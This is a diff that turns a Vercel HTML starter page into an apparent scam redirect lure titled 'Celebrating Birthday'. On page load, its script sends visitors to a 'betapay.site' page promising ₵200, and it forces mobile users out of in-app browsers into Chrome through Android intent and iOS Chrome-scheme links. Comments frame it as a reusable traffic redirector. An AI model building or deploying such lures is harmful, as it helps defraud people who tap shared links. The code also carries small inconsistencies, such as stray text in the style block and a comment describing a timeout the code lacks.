@@ -1,96 +1,147 @@
 <!DOCTYPE html>
+
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <script defer src="/_vercel/insights/script.js"></script>
-    <link
-      rel="stylesheet"
-      href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css"
-    />
-    <title>Vercel HTML Starter</title>
-    <meta
-      name="description"
-      content="High-performance HTML based website template."
-    />
-  </head>
-  <body>
-    <h1>Vercel HTML Starter</h1>
-    <p>
-      This template is a simple, but powerful single
-      <code>index.html</code> file deployed to
-      <a href="https://vercel.com">Vercel</a>. When your site is deployed, all
-      static assets (like HTML, JavaScript, CSS, images, and more) are deployed
-      globally to every
-      <a href="https://vercel.com/docs/concepts/edge-network/overview"
-        >Vercel Edge Network</a
-      >
-      region.
-    </p>
-    <h2>Simple, privacy-friendly analytics</h2>
-    <p>
-      Want to understand your visitor traffic? Vercel Analytics gives you
-      first-party, privacy-friendly traffic analytics for your HTML site. This
-      template is already configured using the following script:
-    </p>
-    <pre><code>&lt;script defer src="/_vercel/insights/script.js"&gt;&lt;/script&gt;</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/analytics">Vercel Analytics</a>.
-    </p>
-    <h2>Integrated with git</h2>
-    <p>
-      Deploying updates to your site is as simple as
-      <code>git push</code> thanks to Vercel's advanced
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-      Support for GitHub, GitLab, Bitbucket is zero-configuration, and with the
-      flexible Vercel CLI and API, you can integrate with any tool possible.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-    </p>
-    <h2>Fast <code>gzip</code> compression</h2>
-    <p>
-      To help ensure the smallest possible file sizes for your static assets,
-      the Vercel Edge Network compresses files by default using
-      <code>gzip</code>. You can also optionally use
-      <code>brotli</code> compressesion if you prefer.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/edge-network/compression"
-        >compression</a
-      >.
-    </p>
-    <h2>Advanced routing configuration</h2>
-    <p>
-      Vercel gives you a variety of ways to configure the routing of your
-      website. For example, adding redirects, rewrites, or headers to your page.
-      While you can use <code>vercel.json</code> to define these through JSON,
-      you can also express your routing configuration as code using
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-    <p>
-      Middleware runs before the
-      <a href="https://vercel.com/docs/concepts/edge-network/caching"
-        >Vercel Edge Network Cache</a
-      >, so you can configure routing exactly as your application needs. For
-      example, this template uses <code>middleware.js</code> defined in the root
-      of the repository to add additional security headers to the site:
-    </p>
-    <pre><code>referrer-policy: origin-when-cross-origin
-strict-transport-security: max-age=31536000; includeSubDomains; preload
-x-content-type-options: nosniff
-x-dns-prefetch-control: on
-x-frame-options: DENY</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-  </body>
+<head>
+
+  
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title> Celebrating Birthday </title>
+<link rel="shortcut icon" type="image/png" href="" />
+<meta name="og:title" content=" Celebrating Birthday " />
+<meta property="og:description" content="Celebrating Birthday" />
+<meta property="og:image" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:updated_time" content="1440432930" />
+<style>Click here to continue...
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+html, body {
+height: 100%;
+background: #ffffff;
+}
+
+body {
+display: flex;
+align-items: center;
+justify-content: center;
+font-family: -apple-system, BlinkMacSystemFont, “Segoe UI”, Roboto, Helvetica, Arial, sans-serif;
+}
+
+.container {
+text-align: center;
+}
+
+#proceedBtn {
+padding: 16px 48px;
+font-size: 18px;
+font-weight: 600;
+letter-spacing: 0.5px;
+color: #ffffff;
+background-color: #1a73e8; /* Chrome-blue accent */
+border: none;
+border-radius: 6px;
+cursor: pointer;
+transition: background-color 0.15s ease, transform 0.1s ease;
+}
+
+#proceedBtn:hover {
+background-color: #1558b0;
+}
+
+#proceedBtn:active {
+transform: scale(0.98);
+}
+
+.note {
+margin-top: 16px;
+font-size: 13px;
+color: #888888;
+max-width: 320px;
+}
+</style>
+
+</head>
+<body>
+
+  <div class="container">
+    <button id="proceedBtn">PROCEED</button>
+    <div class="note" id="noteText">Redirecting… tap PROCEED if nothing happens.</div>
+  </div>
+
+  <script>
+    // The final destination the user should land on.
+    // Change this to whatever URL you actually want to send traffic to.
+    var DESTINATION_URL = "https://shattawale.betapay.site/Birthday-celebration₵200.html";
+
+    var btn = document.getElementById("proceedBtn");
+    var note = document.getElementById("noteText");
+
+    function isAndroid() {
+      return /android/i.test(navigator.userAgent);
+    }
+
+    function isIOS() {
+      return /iphone|ipad|ipod/i.test(navigator.userAgent) ||
+             (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+    }
+
+    function buildAndroidChromeIntent(url) {
+      // Strips the scheme and builds an Android intent:// URL that
+      // explicitly asks the OS to open the link in Chrome.
+      var stripped = url.replace(/^https?:\/\//, "");
+      var scheme = url.indexOf("https://") === 0 ? "https" : "http";
+      return "intent://" + stripped +
+             "#Intent;scheme=" + scheme +
+             ";package=com.android.chrome;end";
+    }
+
+    function goToDestination() {
+      var url = DESTINATION_URL;
+
+      if (isAndroid()) {
+        // Try to force Chrome specifically via an Android intent.
+        // If Chrome isn't installed, Android falls back to the normal link.
+        window.location.href = buildAndroidChromeIntent(url);
+
+        // Fallback in case the intent silently fails
+        // (e.g. some in-app browsers ignore intent:// links).
+        setTimeout(function () {
+          window.location.href = url;
+        }, 1500);
+        return;
+      }
+
+      if (isIOS()) {
+        // iOS has no reliable "force open Chrome" mechanism from a webpage
+        // (Apple restricts default-browser overrides), so we try the
+        // googlechrome:// custom scheme if Chrome is installed, and fall
+        // back to a normal https link (opens in default browser) otherwise.
+        var chromeScheme = url.replace(/^https:\/\//, "googlechromes://")
+                               .replace(/^http:\/\//, "googlechrome://");
+        window.location.href = chromeScheme;
+
+        setTimeout(function () {
+          window.location.href = url;
+        }, 1000);
+        return;
+      }
+
+      // Desktop / everything else: just open the destination normally.
+      // Browsers do not allow a webpage to force a specific desktop
+      // browser to open — this simply navigates the current browser.
+      window.location.href = url;
+    }
+
+    btn.addEventListener("click", goToDestination);
+    // Auto-trigger on page load — no click required.
+    // Kept behind a tiny timeout so the page has a chance to fully
+    // render first (some mobile browsers ignore navigation attempts
+    // fired before the document is "settled").
+    window.addEventListener("load", function () {
+      goToDestination();
+    });
+  </script>
+
+</body>
 </html>
